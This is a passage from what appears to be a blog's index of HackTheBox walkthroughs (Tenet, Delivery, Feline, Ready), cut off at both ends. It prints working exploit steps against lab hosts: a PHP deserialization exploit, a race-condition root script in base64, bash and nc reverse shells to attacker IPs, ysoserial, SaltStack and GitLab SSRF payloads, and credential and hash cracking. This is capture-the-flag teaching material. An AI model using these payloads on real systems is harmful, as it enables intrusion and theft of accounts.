?&amp;gt;&#39;;}$url = &#39;http://10.10.10.223/sator.php?arepo=&#39; . urlencode(serialize(new DatabaseExport));echo urldecode($url);$upload = file_get_contents(&quot;$url&quot;);$exec = file_get_contents(&quot;http://10.10.10.223/poorduck.php&quot;);?&amp;gt; running the script gives us www-data user shell on natcat - ❯ nc -nvlp 4141 listening on [any] 4141 ... connect to [10.10.15.114] from (UNKNOWN) [10.10.10.223] 28858 id uid=33(www-data) gid=33(www-data) groups=33(www-data) python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@tenet:/var/www/html$ from the wordpress config file we get the database creds - www-data@tenet:/var/www/html$ ls ls hush.php poorduck.php sator.php.bak users.txt index.html sator.php shell.php wordpress www-data@tenet:/var/www/html$ cat -n wordpress/wp-config.php | sed -n &#39;21,38p&#39; &amp;lt;l/wordpress$ cat -n wp-config.php | sed -n &#39;21,38p&#39; 21 // ** MySQL settings - You can get this info from your web host ** // 22 /** The name of the database for WordPress */ 23 define( &#39;DB_NAME&#39;, &#39;wordpress&#39; ); 24 25 /** MySQL database username */ 26 define( &#39;DB_USER&#39;, &#39;neil&#39; ); 27 28 /** MySQL database password */ 29 define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; ); 30 31 /** MySQL hostname */ 32 define( &#39;DB_HOST&#39;, &#39;localhost&#39; ); 33 34 /** Database Charset to use in creating database tables. */ 35 define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; ); 36 37 /** The Database Collate type. Don&#39;t change this if in doubt. */ 38 define( &#39;DB_COLLATE&#39;, &#39;&#39; ); i tried login to sql database but there is nothing only found 2 password hashes but they looks like not cracable - mysql -u neil -pOpera2112 mysql&amp;gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys || wordpress |+--------------------+5 rows in set (0.01 sec)mysql&amp;gt; use wordpressReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&amp;gt; show tables;+-----------------------+| Tables_in_wordpress |+-----------------------+| ... [snip] ... || wp_users |+-----------------------+12 rows in set (0.00 sec)mysql&amp;gt; SELECT * FROM wp_users;+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name |+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+| 1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist | protagonist@tenet.htb | http://10.10.10.44/wordpress | 2020-12-16 12:17:10 | | 0 | protagonist || 2 | neil | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil | neil@tenet.htb | http://tenet.htb | 2020-12-16 14:51:26 | | 0 | neil neil |+----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+2 rows in set (0.00 sec) then i try to use database creds to reuse in ssh login and it worked and get the neil user shell - ❯ ssh neil@10.129.34.42neil@10.129.34.42&#39;s password: Opera2112Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)neil@tenet:~$ iduid=1001(neil) gid=1001(neil) groups=1001(neil)neil@tenet:~$ cat user.txt6599558b************************ Root escalation check the user’s sudo rights -neil@tenet:~$ sudo -lMatching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh user can run /usr/local/bin/enableSSH.sh file with sudo without password. viewing the file - neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh-rwxr-xr-x 1 root root 1080 Dec 8 13:46 /usr/local/bin/enableSSH.sh Understanding the script code:#!/bin/bashcheckAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d &quot; &quot; -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo &quot;Successfully added $sshName to authorized_keys file!&quot; else /bin/echo &quot;Error in adding $sshName to authorized_keys file!&quot; fi}checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo &quot;Error in creating key file!&quot; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi}addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) //create temperary file named ssh-&amp;lt;8_rendom_chars&amp;gt; like ssh-Yt45Pc8s, (umask 110; touch $tmpName) //mask file permission to read and write, /bin/echo $key &amp;gt;&amp;gt;$tmpName //append $key variable value in the $tmpName file, checkFile $tmpName //call the checkFile() function to verify that the file is created and $key is added, /bin/cat $tmpName &amp;gt;&amp;gt;/root/.ssh/authorized_keys //now cat out the $tmpName file and append it to root ssh authorized_keys, /bin/rm $tmpName //and remove $tmpName file form tmp directory.}key=&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;addKeycheckAdded //This function execute after key added to authorized_keys to verify `/root/.ssh/authorized_keys` for $key.what-is-umask-and-how-does-it-work ok, So everything is happening in the addkey() function. when $tmpName is created this script append his $key in that file and than add it into the root ssh authorized_keys.Attack Surface: the script first create tmp file and than add his key inside that file and if we add our key to that tmp file at same time when this script add his key our key also added to root ssh authorized_keys. but script done all this work in less then a second and there is no way we can manually add our key to that tmp file for this we can create a loop which execute the script and echoing our ssh key at same time for N number of time - while true; do sudo /usr/local/bin/enableSSH.sh &amp;amp; echo &quot;&amp;lt;public-ssh-key&amp;gt;&quot; | tee /tmp/ssh-* 1&amp;gt;&amp;amp;2 &amp;amp; done i tried it multiple time and in 100 loop i get the success Getting Root shell: create ssh key and add public key into the loop. running the loop - while true; do sudo /usr/local/bin/enableSSH.sh &amp;amp; echo &quot;&amp;lt;public-ssh-key&amp;gt;&quot; | tee /tmp/ssh-* 1&amp;gt;&amp;amp;2 &amp;amp; done use your private ssh key pair to login as root in the box - ssh -i private_key root@10.10.10.223 ❯ ssh -i tenet root@10.129.34.42Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)root@tenet:~# id uid=0(root) gid=0(root) groups=0(root)root@tenet:~# cat root.txt1bec96c5************************root@tenet:~# Exploit Script#!/bin/bashsshpass -p Opera2112 ssh -l neil 10.10.10.223 &quot;rm /tmp/ssh*; base64 -d &amp;lt;&amp;lt;&amp;lt; &#39;Zm9yIGkgaW4gJChzZXEgMTAwMCk7IGRvCiAgICBzdWRvIC91c3IvbG9jYWwvYmluL2VuYWJsZVNTSC5zaCAmCiAgICBlY2hvICJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJnUURmVWVRTDlFVm1JbjdBWTdJUlpuNzIydFdteUplRWFlRlNZa1BtUnB6U2Q4VzNTODlTZFllYVFQU1gwaUZaVjhLSE8vNUJ5Ly9OcVRCQzlNdHF6TnFLVnZNNE12YWl1ZnZLU3gxRUVITTdDQzM2bDdxYkJlYm5aL2JDTFJZVHFzZTdRSDYxVVlMN1lKWFJGYkJ3OG4rQkI0SWJHRjJxcEkxNmpSQk5kK0VMaEFUU3MyYTBRSVJhbzlURm96d0xnRDlRaFlwVzJ5dVdrR2k2alZQR3hCTk9RUi8xbTJHRFJjVTA5VTRka1VBSTk5UGVkS3pGa29KOFpWVVEyTW5hbW1qR000bDlaeWdVZDFhS1lpdFRNY2lpTy9tNUswYWl3bzRTNFlpbGtPQVE5Y0s4aXU3QlFyVjJDYThqcDlJVUZIdG5lM2lJRFpIVUtSRUNRbHd3TGRVRmZwNHBPcXRLbWpBTkRjWlJ2Wjk2dGtDT2tjSXBIaWpWcEV4YkVGdjlSUmY0MUtVUVhKZ1U2dlU0VytldERyTDBhZGJnQlN6MU16eFEvOVl0OXJudzVaOFJVbjNiS214ek5iNDhmQWdsWjdxY0JyeW0zMFFXNUNYMC9HSm1idGtnVHd0S3FldGhNMHdyMHI0cGg2RWh6SkFIVUFpM1VKK0w0eitSSGc2Z09Taz0iIHwgdGVlIC90bXAvc3NoLSogMT4mMiAmCmRvbmU=&#39; | bash &amp;gt; /dev/null 2&amp;gt;&amp;amp;1&quot; &amp;amp;while truedo rspn=$(ssh -o PasswordAuthentication=no -i ./root_key root@10.10.10.223 &#39;id&#39; 2&amp;gt;/dev/null) if [ -z &quot;$rspn&quot; ] then continue else echo &quot;$rspn&quot; break fidone#ssh -i ./root_key root@10.10.10.223 &#39;hostname&#39;ssh -i ./root_key root@10.10.10.223 &#39;flag=$(find / -type f \\( -name &quot;user.txt&quot; -o -name &quot;root.txt&quot; \\) -print 2&amp;gt;/dev/null) &amp;amp;&amp;amp; cat $flag&#39;inotifyinotify API provides a mechanism for monitoring filesystem events. Inotify can be used to monitor individual files, or to monitor directories. When a directory is monitored, inotify will return events for the directory itself, and for files inside the directory. inotify api example in c ippsec explain in tenet videoCompile C codegcc inotify.c -o inofifythis" }, { "title": "Hackthebox - Delivery", "url": "/posts/delivery/", "categories": "hackthebox, linux", "tags": "helpdesk email hijack, hashcat wordlist rules", "date": "2021-01-10 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.222 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.222PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)| 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)|_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Welcome8065/tcp open unknown| fingerprint-strings:| GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 200 OK| Accept-Ranges: bytes| Cache-Control: no-cache, max-age=31556926, public| Content-Length: 3108| Content-Security-Policy: frame-ancestors &#39;self&#39;; script-src &#39;self&#39; cdn.rudderlabs.com| Content-Type: text/html; charset=utf-8| Last-Modified: Mon, 11 Jan 2021 04:55:31 GMT| X-Frame-Options: SAMEORIGIN| X-Request-Id: 5afry1r7n7yktqnmsk59adym1y| X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false| Date: Mon, 11 Jan 2021 07:10:14 GMT| &amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&quot;&amp;gt;&amp;lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot;&amp;gt;&amp;lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&amp;gt;&amp;lt;title&amp;gt;Mattermost&amp;lt;/title&amp;gt;&amp;lt;meta name=&quot;mobile-web-app-capable&quot; content=&quot;yes&quot;&amp;gt;&amp;lt;meta name=&quot;application-name&quot; content=&quot;Mattermost&quot;&amp;gt;&amp;lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no&quot;&amp;gt;&amp;lt;link re| HTTPOptions: | HTTP/1.0 405 Method Not Allowed| Date: Mon, 11 Jan 2021 07:10:15 GMT|_ Content-Length: 0EnumerationPort 80 on port 80 found a subdomain- http://helpdesk.delivery.htb/ and MatterMost server address- http://delivery.htb:8065/ Port 8065 MatterMost server in running on port 8065. MatterMost: Mattermost is an open-source, self-hostable online chat service with file sharing, search, and integrations. It is designed as an internal chat for organizations and companies, and mostly markets itself as an open-source alternative to Slack and Microsoft Teams. there is nothing and service is require login to access. when creating new account, it requires email verification and give resource - Please verify your email address. Check your inbox for an email. Subdomain subdomain- http://helpdesk.delivery.htb/ is running osTcket. osTicket: osTicket is a widely-used open source support ticket system. It seamlessly integrates inquiries created via email, phone and web-based forms into a simple easy-to-use multi-user web interface. here http://helpdesk.delivery.htb/open.php when open a new ticket it gives an ticket number and email address. and from view ticket http://helpdesk.delivery.htb/tickets.php i can see my ticket. but here is the twist, when i create a new ticket it give me an email and say &quot;If you want to add more information to your ticket, just email 4478570@delivery.htb&quot; That means i can add information in my created ticket by sending the information to that email. so, if i use that email to register on MetterMost server than i can get that verification link in my ticket and i got it. and now i can login into MetterMost server and here i found mose messages from root user - first message contains some creds maildeliverer:Youve_G0t_Mail! of the server and using ssh i can able to get user flag directly without any exploitation.these creds also work in admin panel login http://helpdesk.delivery.htb/scp/login.php and initially i spend lot of time on admin panel for vulnerability but found nothing and then i tried to ssh in and it works so lesson here is that always try sshin first if found any creds.second message is also a important hint for rootUser shell sql is running in local server maildeliverer@Delivery:~$ ss -lntp | grep 3306LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* and MatterMost server is using that database server - and the second message comes here with a hint that the database server is contains some hashes that are crackable using hashcat. but first i need to find database creds and if MatterMost is using database that the creds are in the MatterMost config file as the tool documentation says “Mattermost configuration settings are maintained in the config.json“ find the config file maildeliverer@Delivery:~$ find / -name config.json -type f -print 2&amp;gt;/dev/null/opt/mattermost/config/config.json inside the config file i found db creds - &quot;SqlSettings&quot;: { &quot;DriverName&quot;: &quot;mysql&quot;, &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s&quot;, &quot;DataSourceReplicas&quot;: [], &quot;DataSourceSearchReplicas&quot;: [], &quot;MaxIdleConns&quot;: 20, &quot;ConnMaxLifetimeMilliseconds&quot;: 3600000, &quot;MaxOpenConns&quot;: 300, &quot;Trace&quot;: false, &quot;AtRestEncryptKey&quot;: &quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;, &quot;QueryTimeout&quot;: 30, &quot;DisableDatabaseSearch&quot;: false}, DB creds: mmuser:Crack_The_MM_Admin_PW mysql found root hash inside mattermost database. here a small sql command chartmaildeliverer@Delivery:~$ mysql -u mmuser -pCrack_The_MM_Admin_PWWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 130Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MariaDB [(none)]&amp;gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mattermost |+--------------------+2 rows in set (0.001 sec)MariaDB [mattermost]&amp;gt; use mattermost;Database changedMariaDB [mattermost]&amp;gt; show tables;+------------------------+| Tables_in_mattermost |+------------------------+| ... [snip] ... || Users |+------------------------+46 rows in set (0.001 sec)MariaDB [mattermost]&amp;gt; SELECT * FROM Users WHERE Username = &quot;root&quot| Id | CreateAt | UpdateAt | DeleteAt | Username | Password | AuthData | AuthService | Email | EmailVerified | Nickname | FirstName | LastName | Position | Roles | AllowMarketing | Props | NotifyProps | LastPasswordUpdate | LastPictureUpdate | FailedAttempts | Locale | Timezone | MfaActive | MfaSecret |+----------------------------+---------------+---------------+----------+----------+--------------------------------------------------------------+----------+-------------+-------------------+---------------+----------+-----------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+| dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 | 0 | root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL | | root@delivery.htb | 1 | | | | | system_admin system_user | 1 | {} | {&quot;channel&quot;:&quot;true&quot;,&quot;comments&quot;:&quot;never&quot;,&quot;desktop&quot;:&quot;mention&quot;,&quot;desktop_sound&quot;:&quot;true&quot;,&quot;email&quot;:&quot;true&quot;,&quot;first_name&quot;:&quot;false&quot;,&quot;mention_keys&quot;:&quot;&quot;,&quot;push&quot;:&quot;mention&quot;,&quot;push_status&quot;:&quot;away&quot;} | 1609157893370 | 0 | 0 | en | {&quot;automaticTimezone&quot;:&quot;Africa/Abidjan&quot;,&quot;manualTimezone&quot;:&quot;&quot;,&quot;useAutomaticTimezone&quot;:&quot;true&quot;} | 0 | |+----------------------------+---------------+---------------+----------+----------+--------------------------------------------------------------+----------+-------------+-------------------+---------------+----------+-----------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+1 row in set (0.000 sec) Get the hash: root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjORoot shell Crack hash using hashcat but it not gonna work because first we need to understand the second hint use hascat rules to easily crack all variations of common words or phrases. and that word or phrase is PleaseSubscribe! searching on google found a perfect rule for this work from NotSoSecure@github ❯ hashcat -a 0 -m 3200 hash word -r OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule --force# hashcat is slow in linux so i use hashcat only or generating wordlist and then use john to crach the hash❯ echo &quot;PleaseSubscribe&quot; | hashcat -r OneRuleToRuleThemAll.rule --stdout &amp;gt; wordlist❯ sudo john hash -w=wordlistUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 8 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusPleaseSubscribe!21 root1g 0:00:01:38 DONE (2021-01-11 22:28) 0.01014g/s 130.7p/s 130.7c/s 130.7C/s PleaseSubscribe!p..PleaseSubscribe!14Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed❯ sudo john hash --showroot:PleaseSubscribe!211 password hash cracked, 0 left su to root Extras There is a notes.txt file in the root directory - root@Delivery:~# cat note.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.- ippsec " }, { "title": "Hackthebox - Feline", "url": "/posts/feline/", "categories": "hackthebox, linux", "tags": "tomcat 9.0.35, cve-2020-9484, saltstack, cve-2020-11651, cve-2020-11652", "date": "2020-12-21 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.205 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T2 -oA scans/nmap.full 10.10.10.205PORT STATE SERVICE VERSION+ 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)+ 8080/tcp open http Apache Tomcat 9.0.27|_http-title: VirusBucket apache tomcat 9.0.27 running on port 8080Tomcat from /service get a file upload option. Intercept the file upload request in burp And get an error when send request with empty filename from error get file upload directory - /opt/samples/uploads get the error but don’t know what to do with it and don’t find anything else so i review tomcat 9 security reports to find anything related to this error : https://tomcat.apache.org/security-9.html notice one fixed issueFixed in Apache Tomcat 9.0.35 Important: Remote Code Execution via session persistence CVE-2020-9484 and why this, because it’s point clearly says that - an attacker is able to control the contents and name of a file on the server vulnerability: Apache Tomcat RCE by de-serialization, redtimmy.com ArticleExploit surfacePrerequisites The PersistentManager is enabled and it’s using a FileStore The attacker is able to upload a file with arbitrary content, has control over the filename and knows the location where it is uploaded There are gadgets in the classpath that can be used for a Java de-serialization attackAttackusing a specifically crafted request, the attacker will be able to trigger remote code execution via de-serialization of the file under their control.exploit When Tomcat receives a HTTP request with a JSESSIONID cookie, it will ask the Manager to check if this session already exists. Because the attacker can control the value of JSESSIONID sent in the request, what would happen if he put something like JSESSIONID=../../../../../../opt/samples/uploads/anything Tomcat requests the Manager to check if a session with session ID ../../../../../../opt/samples/uploads/anything exists It will first check if it has that session in memory. It does not. But the currently running Manager is a PersistentManager, so it will also check if it has the session on disk. It will check at location directory + sessionid + “.session”, which evaluates to ./session/../../../../../../opt/samples/uploads/anything.session And here we need create create a malicious Java Runtime Environment serialized Object and upload as .session extension to exploit unsafe Java object de-serialization vulnerability because when requesting it from JSESSIONID as cookie, PersistentManager check for session cookie in the disk and cookies are store with .session extension. If the file exists, it will deserialize it and parse the session information from it Tool: ysoserial: for generating payloads.User ExploitReverse_shell:❯ echo &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/tun0/4141 0&amp;gt;&amp;amp;1&#39; | base64convert reverse shell into a java runtime executable:online tool for this is herebash -c {echo,ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC90dW4wLzQxNDEgMD4mMSc=}|{base64,-d}|{bash,-i} Generate serialized object cookie with reverseshell - ❯ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 &quot;bash -c {echo,ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC90dW4wLzQxNDEgMD4mMSc=}|{base64,-d}|{bash,-i}&quot; &amp;gt; duck.session❯ file duck.sessionduck.session: Java serialization data, version 5 Upload file - ❯ curl &#39;http://10.10.10.205:8080/upload.jsp&#39; -F &quot;image=@duck.session&quot;File uploaded successfully! open nc listener - ❯ nc -nvlp 4141listening on [any] 4141 ... Executing reverse shell - ╰─❯ curl &#39;http://10.10.10.205:8080/upload.jsp&#39; -H &quot;Cookie: JSESSIONID=../../../../../../opt/samples/uploads/duck&quot; Get tomcat shell❯ pwncat -lp 4141[21:36:26] received connection from 10.10.10.205:33382 connect.py:255[21:36:32] new host w/ hash fc4ce837c64dfe9f096b06d0150a3288 victim.py:321[21:36:51] pwncat running in /usr/bin/bash victim.py:354[21:37:08] pwncat is ready 🐈 victim.py:771(remote) tomcat@VirusBucket:/$ cd(remote) tomcat@VirusBucket:/home/tomcat$ iduid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)(remote) tomcat@VirusBucket:/home/tomcat$ cat user.txt 28db6375************************Privesc Enumeration there are some port running on localhost -(remote) tomcat@VirusBucket:/home/tomcat$ ss -lntpState Recv-Q Send-Q Local Address:Port Peer Address:Port Process ... [snip] ...LISTEN 0 4096 127.0.0.1:4505 0.0.0.0:* LISTEN 0 4096 127.0.0.1:4506 0.0.0.0:* LISTEN 0 4096 127.0.0.1:8000 0.0.0.0:* LISTEN 0 4096 127.0.0.1:36391 0.0.0.0:* by default saltstack run on port 4505,4506Saltstack is Python-based, open-source software for event-driven IT automation, remote task execution, and configuration management.Found 2 CVEs - Authentication bypass vulnerabilities (CVE-2020-11651) Directory traversal vulnerabilities (CVE-2020-11652)source: f-secure report: SaltStack authorization bypassPoC_Script: by jasperla@githubwhile testing this script find out that the script requires python salt module which is not installed in the box(remote) tomcat@VirusBucket:/tmp$ python3 exploit.py Traceback (most recent call last): File &quot;exploit.py&quot;, line 16, in &amp;lt;module&amp;gt; import saltModuleNotFoundError: No module named &#39;salt&#39;so the script is not gonna work directly, First need to forward 4506 port in the local machine and install the salt module in my local machine.Port forwarding with chiselPrivesc forwarding port 4506 to my local machine - ./chisel client 10.10.14.43:4242 R:4506:127.0.0.1:4506 start server - ./chisel server -p 4242 --reverse open a new nc listener - nc -nvlp 4343 install salt module in my local macjine and run the script - ❯ python3 exploit.py --master 127.0.0.1 --exec &#39;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.43/4343 0&amp;gt;&amp;amp;1&quot;&#39;[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.[+] Checking salt-master (127.0.0.1:4506) status... ONLINE[+] Checking if vulnerable to CVE-2020-11651... YES[*] root key obtained: cydg/5uledxv14SGDpmBbyebuAbZMKJjPTU9oAaF9Xeq6IflytJmJl25GejBnE0w51cDAUhYghA=[+] Attemping to execute bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.43/4343 0&amp;gt;&amp;amp;1&quot; on 127.0.0.1[+] Successfully scheduled job: 20201222115325271998 Docker Escape so what i get is a root shell but inside a docker not in the box itself. there is a todo.txt file in the root dir -```bashroot@2d24bf61767c:~# cat todo.txtcat todo.txt Add saltstack support to auto-spawn sandbox dockers through events. Integrate changes to tomcat and make the service open to public.``` i also notice one this in the root folder that the .bash_history is not set to /dev/null -rw------- 1 root root 3368 Dec 22 12:01 .bash_history and cat the .bash_history file found some interesting data - curl -s --unix-socket /var/run/docker.sock http://localhost/images/json root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json&amp;lt;t /var/run/docker.sock http://localhost/images/json[{&quot;Containers&quot;:-1,&quot;Created&quot;:1590787186,&quot;Id&quot;:&quot;sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e&quot;,&quot;Labels&quot;:null,&quot;ParentId&quot;:&quot;&quot;,&quot;RepoDigests&quot;:null,&quot;RepoTags&quot;:[&quot;sandbox:latest&quot;],&quot;SharedSize&quot;:-1,&quot;Size&quot;:5574537,&quot;VirtualSize&quot;:5574537},{&quot;Containers&quot;:-1,&quot;Created&quot;:1588544489,&quot;Id&quot;:&quot;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&quot;,&quot;Labels&quot;:null,&quot;ParentId&quot;:&quot;&quot;,&quot;RepoDigests&quot;:[&quot;&amp;lt;none&amp;gt;@&amp;lt;none&amp;gt;&quot;],&quot;RepoTags&quot;:[&quot;&amp;lt;none&amp;gt;:&amp;lt;none&amp;gt;&quot;],&quot;SharedSize&quot;:-1,&quot;Size&quot;:1056679100,&quot;VirtualSize&quot;:1056679100}] as we are docker root we can use docker sock to talk with host and execute commands in host,privesc with docker sock 2 another thing is that inside the that this docker container is running sshd -root@2d24bf61767c:~# ss -lntpss -lntpState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((&quot;sshd&quot;,pid=9,fd=3)) LISTEN 0 128 [::]:22 [::]:* users:((&quot;sshd&quot;,pid=9,fd=4))running ssh inside docker is badDocker Exploit TODO: gaining host root access using docker socket Machine Retired!ippsec solution" }, { "title": "Hackthebox - Ready", "url": "/posts/ready/", "categories": "hackthebox, linux", "tags": "gitlab 11.4.7, ssrf, radis, rce, privileged container", "date": "2020-12-13 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.220 ready.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open http nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was http://ready.htb:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutPort 5080 running service nginx http serverRunning gitlab instance Version CE 11.4.7 get in help section after register with new userFootholdgitlab &amp;lt;11.4.8 SSRF via IPv6Searching for gitlab exploit on exploitDB❯ searchsploit gitlab 11.4.7---------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------- ---------------------------------GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.pyGitLab 11.4.7 - Remote Code Execution (Authen | ruby/webapps/49257.py---------------------------------------------- --------------------------------- Blog on GitLab 11.4.7 Remote Code Execution from https://liveoverflow.com/liveoverflow explain in his blog AWA in youtube videoVerify ssrfUsing IPv6 address to bypass the filter on localhost.and it workedNew line injection to Exploit internal redis serverGot Payload form bug reported by Jobert Abma hacker1 reportgit://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push &quot;{\\&quot;class\\&quot;:\\&quot;GitlabShellWorker\\&quot;,\\&quot;args\\&quot;:[\\&quot;class_eval\\&quot;,\\&quot;open(\\&#39;|nc -e /bin/bash 10.10.15.71 4141\\&#39;).read\\&quot;],\\&quot;retry\\&quot;:3,\\&quot;queue\\&quot;:\\&quot;system_hook_push\\&quot;,\\&quot;jid\\&quot;:\\&quot;ad52abc5641173e217eb2e52\\&quot;,\\&quot;created_at\\&quot;:1513714403.8122594,\\&quot;enqueued_at\\&quot;:1513714403.8129568}&quot; exec exec/ssrf.giturl encoded from 